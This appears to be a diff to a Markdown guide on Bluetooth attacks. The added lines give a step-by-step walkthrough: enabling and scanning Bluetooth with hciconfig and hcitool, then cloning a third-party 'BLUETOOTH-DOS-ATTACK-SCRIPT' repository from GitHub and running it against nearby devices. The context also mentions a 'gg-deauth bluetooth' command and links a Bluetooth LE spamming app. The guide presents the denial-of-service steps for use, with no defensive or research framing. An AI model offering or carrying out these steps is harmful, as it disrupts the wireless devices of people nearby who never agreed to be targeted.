@@ -149,18 +149,19 @@ Here, the `git clone` command may ask for your 'username' & 'password' of GitHub
 
 
 #### Step 2 (METHOD - 2) : Scanning & Attack device
-Scan & Attack on device. . . .
-
-
-
-
-
-
-
-
-
-
-
+Scan & Attack on device with the following mini-steps : 
+- List all the connected / identified USB devices : `lsusb`
+- List connected BT devices with thier status : `hciconfig`
+- Turn on BT device : `hciconfig hci0 up`
+- List connected BT devices with thier status : `hciconfig`
+- Scan surrounding BT devices : `hcitool scan`
+- Clone BT DoS attacke python script : `git clone https://github.com/xanonDev/BLUETOOTH-DOS-ATTACK-SCRIPT`
+- List current directory content : `ls`
+- Go into the repository directory : `cd BLUETOOTH-DOS-ATTACK-SCRIPT`
+- List current directory content : `ls`
+- Execute the DoS attack script : `python3 Bluetooth-DOS-Attack.py`
+<br>
+<br>
 
 
 
@@ -186,9 +187,6 @@ gg-deauth bluetooth
 There is also an android bluetooth spammig app, we can get this app from [GitHub](https://github.com/simondankelmann/Bluetooth-LE-Spam).
 
 
----
--- create the clear .md file also. . . .
-
-
+<br>
 
 
